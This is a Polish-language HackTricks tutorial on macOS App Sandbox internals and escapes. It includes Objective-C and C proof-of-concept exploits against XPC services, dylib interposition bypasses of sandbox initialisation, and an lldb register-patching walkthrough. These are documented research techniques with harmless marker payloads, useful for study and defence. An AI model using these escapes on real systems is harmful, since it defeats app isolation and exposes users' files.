# Debugowanie i omijanie Sandbox w macOS

{{#include ../../../../../banners/hacktricks-training.md}}

## Proces ładowania Sandbox

<figure><img src="../../../../../images/image (901).png" alt=""><figcaption><p>Obraz pochodzi z <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

Na poprzednim obrazie można zaobserwować **jak ładowany jest sandbox**, gdy uruchamiana jest aplikacja z entitlementem **`com.apple.security.app-sandbox`**.

Kompilator połączy `/usr/lib/libSystem.B.dylib` z plikiem binarnym.

Następnie **`libSystem.B`** wywoła kilka innych funkcji, aż **`xpc_pipe_routine`** prześle entitlements aplikacji do **`securityd`**. Securityd sprawdza, czy proces powinien zostać poddany kwarantannie w Sandboxie, i jeśli tak, poddaje go kwarantannie.\
Na koniec sandbox zostanie aktywowany przez wywołanie **`__sandbox_ms`**, które wywoła **`__mac_syscall`**.<sup>[[1]](#references)[[3]](#references)</sup>

## Możliwe obejścia

### Omijanie atrybutu kwarantanny

**Pliki tworzone przez procesy działające w sandboxie** otrzymują **atrybut kwarantanny**, aby zapobiegać ucieczkom z sandboxa: jeśli upuścisz nową aplikację i spróbujesz ją uruchomić, flaga kwarantanny ją zatrzyma. Dlatego **jeśli możesz upuścić plik lub folder *bez* atrybutu kwarantanny, możesz uciec z App Sandbox** — wystarczy upuścić pakiet `.app` i uruchomić go za pomocą `open`, ponieważ nowo uruchomiony proces działa pod kontrolą LaunchServices, a nie w twoim sandboxie.

Niezawodnym sposobem uzyskania **upuszczenia bez kwarantanny** jest poproszenie **innego procesu o utworzenie pliku za ciebie**. Jak opisano w [**A New Era of macOS Sandbox Escapes**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) autorstwa Mickey Jin, **App Sandbox** oznacza upuszczone pliki kwarantanną, ale usługi XPC działające w ramach Service Sandbox **nie**. Kilka nieuwierzytelnionych usług XPC mogło więc zostać użytych jako prymityw „prania kwarantanny”:<sup>[[4]](#references)</sup>

- **CVE-2023-27944** (`TrialArchivingService`) oraz **CVE-2023-32414** (`ArchiveService`): rozpakowują archiwum przekazane przez aplikację działającą w sandboxie do wybranej lokalizacji **bez propagowania kwarantanny xattr** do rozpakowanej zawartości.
- **CVE-2023-42977** (`PerfPowerServicesSignpostReader`): path traversal w `submitSignpostDataWithConfig:` umożliwiał tworzenie **dowolnych katalogów bez kwarantanny**, co wystarcza do zbudowania całej struktury pakietu `.app` poza kontenerem.
- **CVE-2024-27864** (`diskimagescontroller.xpc`): dołącza obraz DMG objęty kwarantanną **bez obejmowania kwarantanną wynikowego urządzenia**, dzięki czemu aplikacje na zamontowanym woluminie można uruchamiać.

> [!TIP]
> Rozpakowywanie zazwyczaj **usuwa bit uprawnień wykonywania**. Obejście zastosowane w CVE-2023-27944 polegało na umieszczeniu **symlinku** do istniejącego podpisanego binarium systemowego (np. `/System/Library/CoreServices/Automator Application Stub`) jako głównego pliku wykonywalnego pakietu, dzięki czemu można go uruchomić bez konieczności posiadania `+x` na upuszczonym pliku.

> [!CAUTION]
> Działa to dlatego, że sprawdzenie jest oparte na **fladze elementu, który jest uruchamiany**: *„Gdy aplikacja lub inny kod wykonywalny jest uruchamiany z Findera lub GUI, macOS sprawdza jego flagę kwarantanny”*, a dopiero wtedy *„przekazuje go do Gatekeeper w celu wykonania pełnych kontroli bezpieczeństwa przy 'pierwszym uruchomieniu'”* ([Explainer: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)). Brak flagi na uruchamianym pakiecie oznacza brak kontroli Gatekeepera — dokładnie taki prymityw zapewniają powyższe CVE.<sup>[[5]](#references)</sup>
>
> Należy pamiętać, że jeśli pakiet `.app` został już autoryzowany do uruchomienia (ma xattr kwarantanny z włączoną flagą „authorized to run”), można go również abuse'ować... z wyjątkiem tego, że nie można już zapisywać wewnątrz pakietów **`.app`**, chyba że posiada się uprzywilejowane uprawnienia TCC (których nie będzie się mieć w sandboxie).

### Abuse funkcjonalności Open

W [**ostatnich przykładach omijania sandboxa Word**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) można zobaczyć, jak funkcjonalność CLI **`open`** może zostać wykorzystana do ominięcia sandboxa.


{{#ref}}
macos-office-sandbox-bypasses.md
{{#endref}}

### Launch Agents/Daemons

Nawet jeśli aplikacja **ma działać w sandboxie** (`com.apple.security.app-sandbox`), możliwe jest ominięcie sandboxa, jeśli zostanie ona na przykład **uruchomiona z LaunchAgent** (`~/Library/LaunchAgents`).\
Jak wyjaśniono w [**tym wpisie**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818), jeśli chcesz uzyskać persistence za pomocą aplikacji działającej w sandboxie, możesz skonfigurować jej automatyczne uruchamianie jako LaunchAgent i być może wstrzyknąć złośliwy kod za pomocą zmiennych środowiskowych DyLib.<sup>[[6]](#references)</sup>

### Abuse lokalizacji automatycznego uruchamiania

Jeśli proces działający w sandboxie może **zapisywać** w miejscu, w którym **później aplikacja działająca poza sandboxem uruchomi plik binarny**, będzie mógł **uciec przez samo umieszczenie** tam tego pliku binarnego. Dobrym przykładem takich lokalizacji są `~/Library/LaunchAgents` lub `/System/Library/LaunchDaemons`.

W tym celu mogą być potrzebne nawet **2 kroki**: należy doprowadzić do wykonania kodu przez proces z **bardziej liberalnym sandboxem** (`file-read*`, `file-write*`), który faktycznie zapisze go w miejscu, gdzie zostanie on **wykonany poza sandboxem**.

Sprawdź tę stronę dotyczącą **lokalizacji automatycznego uruchamiania**:


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

### Abuse innych procesów

Jeśli z procesu działającego w sandboxie możesz **skompromitować inne procesy** działające w mniej restrykcyjnych sandboxach (lub bez nich), będziesz mógł uciec do ich sandboxów:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

### Dostępne systemowe i użytkownika usługi Mach

Sandbox umożliwia również komunikację z określonymi **usługami Mach** za pośrednictwem XPC zdefiniowanego w profilu `application.sb`. Jeśli uda ci się **abuse'ować** jedną z tych usług, możesz być w stanie **uciec z sandboxa**.

Jak wskazano w [tym writeupie](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), informacje o usługach Mach są przechowywane w `/System/Library/xpc/launchd.plist`. Wszystkie systemowe i użytkownika usługi Mach można znaleźć, wyszukując w tym pliku ciągi `<string>System</string>` oraz `<string>User</string>`.<sup>[[4]](#references)</sup>

Ponadto można sprawdzić, czy usługa Mach jest dostępna dla aplikacji działającej w sandboxie, wywołując `bootstrap_look_up`:
```objectivec
void checkService(const char *serviceName) {
mach_port_t service_port = MACH_PORT_NULL;
kern_return_t err = bootstrap_look_up(bootstrap_port, serviceName, &service_port);
if (!err) {
NSLog(@"available service:%s", serviceName);
mach_port_deallocate(mach_task_self_, service_port);
}
}

void print_available_xpc(void) {
NSDictionary<NSString*, id>* dict = [NSDictionary dictionaryWithContentsOfFile:@"/System/Library/xpc/launchd.plist"];
NSDictionary<NSString*, id>* launchDaemons = dict[@"LaunchDaemons"];
for (NSString* key in launchDaemons) {
NSDictionary<NSString*, id>* job = launchDaemons[key];
NSDictionary<NSString*, id>* machServices = job[@"MachServices"];
for (NSString* serviceName in machServices) {
checkService(serviceName.UTF8String);
}
}
}
```
### Dostępne usługi Mach PID

Te usługi Mach zostały po raz pierwszy wykorzystane do [ucieczki z sandboxa w tym writeupie](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/). W tamtym czasie **wszystkie usługi XPC wymagane** przez aplikację i jej framework były widoczne w domenie PID aplikacji (są to usługi Mach z `ServiceType` ustawionym na `Application`).<sup>[[4]](#references)</sup>

Aby **skontaktować się z usługą XPC domeny PID**, wystarczy zarejestrować ją w aplikacji za pomocą wiersza takiego jak:
```objectivec
[[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load];
```
Ponadto można znaleźć wszystkie usługi Mach **Application**, wyszukując w pliku `System/Library/xpc/launchd.plist` ciąg `<string>Application</string>`.

Innym sposobem na znalezienie prawidłowych usług xpc jest sprawdzenie tych znajdujących się w:
```bash
find /System/Library/Frameworks -name "*.xpc"
find /System/Library/PrivateFrameworks -name "*.xpc"
```
Kilka przykładów wykorzystujących tę technikę można znaleźć w [**oryginalnym opisie**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), jednak poniżej przedstawiono kilka podsumowanych przykładów.<sup>[[4]](#references)</sup>

#### /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc

Ten service zezwala na każde połączenie XPC, zawsze zwracając `YES`, a metoda `runTask:arguments:withReply:` wykonuje dowolne polecenie z dowolnymi parametrami.

Exploit był „tak prosty, jak”:
```objectivec
@protocol SKRemoteTaskRunnerProtocol
-(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply;
@end

void exploit_storagekitfsrunner(void) {
[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/StorageKit.framework"] load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.storagekitfsrunner"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SKRemoteTaskRunnerProtocol)];
[conn setInterruptionHandler:^{NSLog(@"connection interrupted!");}];
[conn setInvalidationHandler:^{NSLog(@"connection invalidated!");}];
[conn resume];

[[conn remoteObjectProxy] runTask:[NSURL fileURLWithPath:@"/usr/bin/touch"] arguments:@[@"/tmp/sbx"] withReply:^(NSNumber *bSucc, NSError *error) {
NSLog(@"run task result:%@, error:%@", bSucc, error);
}];
}
```
#### /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc

Ten XPC service zezwalał każdemu klientowi, zawsze zwracając `YES`, a metoda `createZipAtPath:hourThreshold:withReply:` przyjmowała ścieżkę do folderu i kompresowała go do pliku ZIP.

W związku z tym można było wygenerować fałszywą strukturę folderu aplikacji, skompresować ją, a następnie zdekompresować i wykonać, aby escape z sandbox, ponieważ nowe pliki nie miały atrybutu quarantine.

Exploit polegał na:
```objectivec
@protocol AudioAnalyticsHelperServiceProtocol
-(void)pruneZips:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
-(void)createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
@end
void exploit_AudioAnalyticsHelperService(void) {
NSString *currentPath = NSTemporaryDirectory();
chdir([currentPath UTF8String]);
NSLog(@"======== preparing payload at the current path:%@", currentPath);
system("mkdir -p compressed/poc.app/Contents/MacOS; touch 1.json");
[@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:@"compressed/poc.app/Contents/MacOS/poc" atomically:YES encoding:NSUTF8StringEncoding error:0];
system("chmod +x compressed/poc.app/Contents/MacOS/poc");

[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework"] load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.internal.audioanalytics.helper"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(AudioAnalyticsHelperServiceProtocol)];
[conn resume];

[[conn remoteObjectProxy] createZipAtPath:currentPath hourThreshold:0 withReply:^(id *error){
NSDirectoryEnumerator *dirEnum = [[[NSFileManager alloc] init] enumeratorAtPath:currentPath];
NSString *file;
while ((file = [dirEnum nextObject])) {
if ([[file pathExtension] isEqualToString: @"zip"]) {
// open the zip
NSString *cmd = [@"open " stringByAppendingString:file];
system([cmd UTF8String]);

sleep(3); // wait for decompression and then open the payload (poc.app)
NSString *cmd2 = [NSString stringWithFormat:@"open /Users/%@/Downloads/%@/poc.app", NSUserName(), [file stringByDeletingPathExtension]];
system([cmd2 UTF8String]);
break;
}
}
}];
}
```
#### /System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc

Ta usługa XPC umożliwia nadanie klientowi XPC dostępu do odczytu i zapisu dowolnego URL za pośrednictwem metody `extendAccessToURL:completion:`, która akceptowała dowolne połączenie. Ponieważ usługa XPC ma FDA, możliwe jest nadużycie tych uprawnień w celu całkowitego obejścia TCC.

Exploit polegał na:
```objectivec
@protocol WFFileAccessHelperProtocol
- (void) extendAccessToURL:(NSURL *) url completion:(void (^) (FPSandboxingURLWrapper *, NSError *))arg2;
@end
typedef int (*PFN)(const char *);
void expoit_ShortcutsFileAccessHelper(NSString *target) {
[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/WorkflowKit.framework"]load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.WorkflowKit.ShortcutsFileAccessHelper"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(WFFileAccessHelperProtocol)];
[conn.remoteObjectInterface setClasses:[NSSet setWithArray:@[[NSError class], objc_getClass("FPSandboxingURLWrapper")]] forSelector:@selector(extendAccessToURL:completion:) argumentIndex:0 ofReply:1];
[conn resume];

[[conn remoteObjectProxy] extendAccessToURL:[NSURL fileURLWithPath:target] completion:^(FPSandboxingURLWrapper *fpWrapper, NSError *error) {
NSString *sbxToken = [[NSString alloc] initWithData:[fpWrapper scope] encoding:NSUTF8StringEncoding];
NSURL *targetURL = [fpWrapper url];

void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", 2);
PFN sandbox_extension_consume = (PFN)dlsym(h, "sandbox_extension_consume");
if (sandbox_extension_consume([sbxToken UTF8String]) == -1)
NSLog(@"Fail to consume the sandbox token:%@", sbxToken);
else {
NSLog(@"Got the file R&W permission with sandbox token:%@", sbxToken);
NSLog(@"Read the target content:%@", [NSData dataWithContentsOfURL:targetURL]);
}
}];
}
```
### Statyczna kompilacja i dynamiczne linkowanie

[**This research**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) odkryło 2 sposoby na obejście Sandbox. Ponieważ sandbox jest nakładany z poziomu userlandu podczas ładowania biblioteki **libSystem**. Gdyby binary mógł uniknąć jej załadowania, nigdy nie zostałby objęty sandboxem:<sup>[[2]](#references)</sup>

- Gdyby binary był **całkowicie statycznie skompilowany**, mógłby uniknąć ładowania tej biblioteki.
- Gdyby **binary nie musiał ładować żadnych bibliotek** (ponieważ linker również znajduje się w libSystem), nie musiałby ładować libSystem.

### Shellcodes

Należy zauważyć, że **nawet shellcodes** w ARM64 muszą być linkowane z `libSystem.dylib`:
```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```
### Ograniczenia nieprziedziedziczone

Jak wyjaśniono w **[bonusie tego write-upu](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)**, ograniczenie sandboxa takie jak:<sup>[[4]](#references)</sup>
```
(version 1)
(allow default)
(deny file-write* (literal "/private/tmp/sbx"))
```
można obejść, uruchamiając na przykład nowy proces:
```bash
mkdir -p /tmp/poc.app/Contents/MacOS
echo '#!/bin/sh\n touch /tmp/sbx' > /tmp/poc.app/Contents/MacOS/poc
chmod +x /tmp/poc.app/Contents/MacOS/poc
open /tmp/poc.app
```
Jednak oczywiście ten nowy proces nie odziedziczy entitlements ani uprawnień po procesie nadrzędnym.

### Entitlements

Należy pamiętać, że nawet jeśli niektóre **actions** mogą być **dozwolone przez sandbox**, gdy aplikacja ma określony **entitlement**, jak w przypadku:
```scheme
(when (entitlement "com.apple.security.network.client")
(allow network-outbound (remote ip))
(allow mach-lookup
(global-name "com.apple.airportd")
(global-name "com.apple.cfnetwork.AuthBrokerAgent")
(global-name "com.apple.cfnetwork.cfnetworkagent")
[...]
```
### Interposting Bypass

Więcej informacji o **Interposting**:


{{#ref}}
../../../macos-proces-abuse/macos-function-hooking.md
{{#endref}}

#### Interpost `_libsecinit_initializer`, aby zapobiec sandboxowi
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
void (*overriden__libsecinit_initializer)(void);
void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```
#### Interpost `__mac_syscall`, aby zapobiec Sandboxowi
```c:interpose.c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
printf("Bypassing Sandbox initiation.\n");
return 0; // pretend we did the job without actually calling __mac_syscall
}
// Call the original function for other cases
return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
const void *replacement;
const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```
### Debugowanie i omijanie Sandbox za pomocą lldb

Let's compile an application that should be sandboxed:

{{#tabs}}
{{#tab name="sand.c"}}
```c
#include <stdlib.h>
int main() {
system("cat ~/Desktop/del.txt");
}
```
{{#endtab}}

{{#tab name="entitlements.xml"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="Info.plist"}}
```xml
<plist version="1.0">
<dict>
<key>CFBundleIdentifier</key>
<string>xyz.hacktricks.sandbox</string>
<key>CFBundleName</key>
<string>Sandbox</string>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

Następnie skompiluj aplikację:
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
> [!CAUTION]
> Aplikacja spróbuje **odczytać** plik **`~/Desktop/del.txt`**, na co **Sandbox** nie pozwoli.\
> Utwórz w tym miejscu plik, ponieważ po ominięciu **Sandbox** aplikacja będzie mogła go odczytać:
>
> ```bash
> echo "Sandbox Bypassed" > ~/Desktop/del.txt
> ```

Zdebugujmy aplikację, aby sprawdzić, kiedy ładowany jest **Sandbox**:
```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
0x187659904 <+4>:  svc    #0x80
0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```
> [!WARNING] > **Nawet po obejściu Sandbox TCC** zapyta użytkownika, czy chce zezwolić procesowi na odczytywanie plików z pulpitu

## References

- [1] [Jonathan Levin - Apple Sandbox: Deeper into the Quagmire (slajdy HITB GSEC 2016)](http://newosxbook.com/files/HITSB.pdf)
- [2] [Saagar Jha - Obejście Sandbox Mac App Store](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
- [3] [Jonathan Levin - Apple Sandbox: Deeper into the Quagmire (HITB GSEC 2016)](https://www.youtube.com/watch?v=mG715HcDgO8)
- [4] [Mickey Jin - A New Era of macOS Sandbox Escapes](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) (unquarantined drops via XPC services: CVE-2023-27944, CVE-2023-32414, CVE-2023-42977, CVE-2024-27864)
- [5] [The Eclectic Light Company - Explainer: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)
- [6] [Vicarius vSociety - CVE-2023-26818 (Sandbox): macOS TCC Bypass w/ Telegram using DyLib Injection (Part 2)](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818)
{{#include ../../../../../banners/hacktricks-training.md}}
